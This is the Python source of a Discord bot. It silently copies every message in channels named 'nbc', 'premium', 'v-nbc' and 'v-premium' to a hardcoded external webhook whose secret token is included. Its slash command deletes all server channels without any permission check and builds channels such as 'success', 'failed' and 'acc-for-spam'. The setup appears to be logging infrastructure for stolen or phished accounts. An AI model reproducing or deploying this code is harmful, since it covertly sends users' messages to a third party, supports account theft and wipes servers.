import discord
from discord.ext import commands
from discord import app_commands
import aiohttp
import os

# ─── Setup ─────────────────────────────────────────────────────
intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.messages = True
intents.dm_messages = True

bot = commands.Bot(command_prefix="!", intents=intents)

# ─── Events ────────────────────────────────────────────────────
@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user}")
    try:
        synced = await bot.tree.sync()
        print(f"⚡ Synced {len(synced)} slash commands!")
    except Exception as e:
        print(f"❌ Error syncing commands: {e}")

@bot.event
async def on_message(message):
    monitored_channels = ["〔🔓〕nbc", "〔🔓〕premium", "〔🔐〕v-nbc", "〔🔐〕v-premium"]

    if message.channel.name in monitored_channels:
        try:
            async with aiohttp.ClientSession() as session:
                webhook = discord.Webhook.from_url(
                    "https://discord.com/api/webhooks/1355572164459364553/tdVb92IhPwin924k7kCZQqFd-s-IzClzJ063nTSVyl1cMHSpwHBxYokXW7YvNTEp6BxT",
                    session=session
                )
                content = f"**Channel:** #{message.channel.name}\n**Author:** {message.author}\n**Message:** {message.content}"
                await webhook.send(content)
        except Exception as e:
            print(f"❗ Error sending to webhook: {e}")

    await bot.process_commands(message)

# ─── Slash Command ─────────────────────────────────────────────
@bot.tree.command(name="gen_webhooks", description="Regenerate server with channels and webhooks inside a red embed.")
async def gen_webhooks(interaction: discord.Interaction):
    try:
        await interaction.response.defer(thinking=True, ephemeral=True)
    except Exception as e:
        print(f"⚠️ Couldn't defer interaction: {e}")

    guild = interaction.guild
    if not guild:
        try:
            await interaction.followup.send("❌ This command can only be used in a server.", ephemeral=True)
        except:
            pass
        return

    # ─ Delete old channels ─
    for channel in guild.channels:
        try:
            await channel.delete()
        except Exception as e:
            print(f"❗ Failed to delete {channel.name}: {e}")

    # ─ Create structure ─
    structure = {
        ".": ["〔🕸️〕saved webhook", "〔🌐〕site"],
        ".2": ["〔🚪〕visit"],
        ".3": ["〔🔓〕nbc", "〔🔓〕premium", "〔🔐〕v-nbc", "〔🔐〕v-premium"],
        ".4": ["〔📈〕success", "〔📉〕failed"],
        ".5": ["〔📜〕acc-with-group", "〔📜〕acc-for-spam"]
    }

    created_channels = {}
    saved_webhook_channel = None

    for category_name, channels in structure.items():
        category = await guild.create_category(category_name)
        for chan_name in channels:
            channel = await guild.create_text_channel(chan_name, category=category)
            created_channels[chan_name] = channel
            if chan_name == "〔🕸️〕saved webhook":
                saved_webhook_channel = channel

    if not saved_webhook_channel:
        try:
            await interaction.followup.send("❌ Failed to create saved webhook channel.", ephemeral=True)
        except:
            pass
        return

    # ─ Create webhooks and build embed ─
    webhook_embed = discord.Embed(
        title="🕸️ Saved Webhooks",
        description="Here are your generated webhooks.",
        color=discord.Color.red()
    )

    for chan_name, channel in created_channels.items():
        if channel.id == saved_webhook_channel.id:
            continue
        try:
            webhook = await channel.create_webhook(name=f"Webhook - {chan_name}")
            webhook_embed.add_field(
                name=f"#{chan_name}",
                value=webhook.url,
                inline=False
            )
        except Exception as e:
            print(f"❗ Failed to create webhook in {chan_name}: {e}")

    webhook_embed.set_image(
        url="https://fiverr-res.cloudinary.com/images/f_auto,q_auto,t_main1/v1/attachments/delivery/asset/aa0d9d6c8813f5f65a00b2968ce75272-1668785195/Comp_1/do-a-cool-custom-animated-discord-profile-picture-or-banner-50-clients.gif"
    )

    # ─ Send the embed and finalize ─
    try:
        await saved_webhook_channel.send(embed=webhook_embed)
        print(f"✅ Webhooks sent inside embed to {saved_webhook_channel.name}.")
    except Exception as e:
        print(f"❌ Failed to send embed: {e}")

    # ─ Final followup message ─
    try:
        await interaction.followup.send("✅ Server reset and webhooks generated successfully!", ephemeral=True)
    except Exception as e:
        print(f"⚠️ Couldn't send final followup message: {e}")

# ─── Run Bot ────────────────────────────────────────────────────
bot.run(os.getenv("TOKEN"))
